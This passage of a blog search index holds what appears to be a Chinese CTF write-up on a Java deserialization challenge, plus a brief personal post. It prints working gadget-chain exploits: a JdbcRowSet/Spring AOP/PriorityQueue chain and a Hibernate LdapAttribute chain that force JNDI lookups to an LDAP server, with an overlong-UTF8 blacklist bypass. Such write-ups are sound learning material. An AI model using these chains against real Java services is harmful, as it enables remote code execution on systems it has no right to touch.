jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/8cb29d&quot;);</span><br><span class="line">        Method method=jdbcRowSet.getClass().getMethod(&quot;getDatabaseMetaData&quot;);</span><br><span class="line">        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);</span><br><span class="line">        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);</span><br><span class="line">        Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice,Advice.class);</span><br><span class="line">        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,new Class[]&#123;Comparator.class&#125;);</span><br><span class="line">        PriorityQueue PQ=new PriorityQueue(1);</span><br><span class="line">        PQ.add(1);</span><br><span class="line">        PQ.add(2);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(PQ,&quot;comparator&quot;,finalproxy);</span><br><span class="line">        ReflectUtil.setFieldValue(PQ,&quot;queue&quot;,new Object[]&#123;proxy1,proxy1&#125;);</span><br><span class="line">        System.out.println(SerializeUtil.serializeBypass(PQ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来就是注谁的问题,看了一下<code>Jackson</code>的版本,还是能打,可以考虑直接打Jackson链,本地成功的执行了命令.<br>看到了一位师傅的blog:<a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">软件系统安全赛</a>,说是可以打一个druid+hsql二次反序列化.hsql有好多二次反序列化的打法,都是在jndi注入的时候打的,这里我没研究过,索性挨个试.<br>直接使用java-chains去生成payload<br><img src="/images/Pasted%20image%2020250402195012.png"><br>也是成功的执行命令了.</p><p>后记(来自上面师傅的博客):<br><img src="/images/Pasted%20image%2020250402195708.png"></p><p>补档:学了Hibernate反序列化之后,发现这题也可以直接用Hibernate反序列化去打一个LdapAttribute注入,下面是构造的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import org.hibernate.engine.spi.TypedValue;</span><br><span class="line">import org.hibernate.property.access.spi.Getter;</span><br><span class="line">import org.hibernate.property.access.spi.GetterMethodImpl;</span><br><span class="line">import org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line">import org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line">import org.hibernate.type.ComponentType;</span><br><span class="line"></span><br><span class="line">import javax.naming.CompositeName;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Hibernate1 &#123;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * org.hibernate.property.access.spi.GetterMethodImpl.get()</span><br><span class="line">     * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">     * org.hibernate.type.ComponentType.getPropertyValue(C)</span><br><span class="line">     * org.hibernate.type.ComponentType.getHashCode()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span><br><span class="line">     * org.hibernate.internal.util.ValueHolder.getValue()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue.hashCode()</span><br><span class="line">     */</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        String ldapCtxUrl = &quot;ldap://127.0.0.1:50389/&quot;;</span><br><span class="line">        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span><br><span class="line">        Class basicAttributeClazz = Class.forName(&quot;javax.naming.directory.BasicAttribute&quot;);</span><br><span class="line">        Object ldapAttribute = ReflectUtil.newInstance(ldapAttributeClazz, basicAttributeClazz, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;name&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,&quot;baseCtxURL&quot;,ldapCtxUrl);</span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,&quot;rdn&quot;,new CompositeName(&quot;55f375/&quot;));</span><br><span class="line"></span><br><span class="line">        ComponentType componentType = (ComponentType) ReflectUtil.newInstance(ComponentType.class,null,null);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(componentType,&quot;propertySpan&quot;,2);</span><br><span class="line"></span><br><span class="line">        TypedValue typedValue = new TypedValue(componentType, ldapAttribute);</span><br><span class="line"></span><br><span class="line">        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) ReflectUtil.newInstance(PojoComponentTuplizer.class,null,null);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(AbstractComponentTuplizer.class,pojoComponentTuplizer,&quot;getters&quot;,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, ldapAttributeClazz.getDeclaredMethod(&quot;getAttributeDefinition&quot;))&#125;);</span><br><span class="line">        ReflectUtil.setFieldValue(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = new Hashtable();</span><br><span class="line">        hashTable.put(1,1);</span><br><span class="line"></span><br><span class="line">        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);</span><br><span class="line">        tableField.setAccessible(true);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(hashTable);</span><br><span class="line">        for (Object entry: table)&#123;</span><br><span class="line">            if (entry != null)&#123;</span><br><span class="line">                ReflectUtil.setFieldValue(entry,&quot;key&quot;,typedValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte[] bytes = SerializeUtil.serializeBypass(hashTable);</span><br><span class="line"></span><br><span class="line">//        SerializeUtil.deserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里反射构造对象的时候需要手动指定<code>LdapAttribute</code>的父类为<code>BasicAttribute</code>.<br>然而在实际打的时候发现了一个问题,<code>UTF8OverlongEncoding</code>bypass后还是带naming,这是由于进行Overlong Bypass使用的工具类只对<code>TC_CLASSDESC</code>进行了处理导致的.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StreamHeader</span><br><span class="line">  -&gt; magic number (0xAC ED)</span><br><span class="line">  -&gt; version (0x00 05)</span><br><span class="line"></span><br><span class="line">Content (多个对象内容)</span><br><span class="line">  -&gt; TC_OBJECT</span><br><span class="line">    -&gt; classDesc</span><br><span class="line">      -&gt; TC_CLASSDESC</span><br><span class="line">        -&gt; className (UTF写入)</span><br><span class="line">        -&gt; serialVersionUID</span><br><span class="line">        -&gt; flags</span><br><span class="line">        -&gt; fieldDesc (字段信息)</span><br><span class="line">        -&gt; classAnnotations</span><br><span class="line">        -&gt; superClassDesc</span><br><span class="line">    -&gt; values</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以参考<a href="https://whoopsunix.com/docs/PPPYSO/advance/UTFMIX/">这篇文章</a>去手动处理,但是懒了,留到下次组会(?</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么要换新博客</title>
      <link href="/2025/04/21/hello-world/"/>
      <url>/2025/04/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>自信安国赛败于天津后，决心开始一条全新的学习道路。<br>过往种种，皆为云烟；此后岁月，俱是纤尘。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
